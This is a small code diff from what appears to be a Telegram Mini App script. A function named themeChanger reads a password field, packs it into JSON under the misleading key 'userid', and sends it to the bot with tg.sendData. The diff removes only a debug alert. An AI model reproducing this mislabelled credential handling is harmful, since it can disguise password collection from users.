@@ -14,7 +14,6 @@ function themeChanger() {
             alert(text)
             var password = document.getElementById('password').value;
             let kek = '{\n\t"username": "' + text + '",\n\t"userid": "' + password + '"\n}';
-            alert(kek);
             tg.sendData(kek);
 })
 })
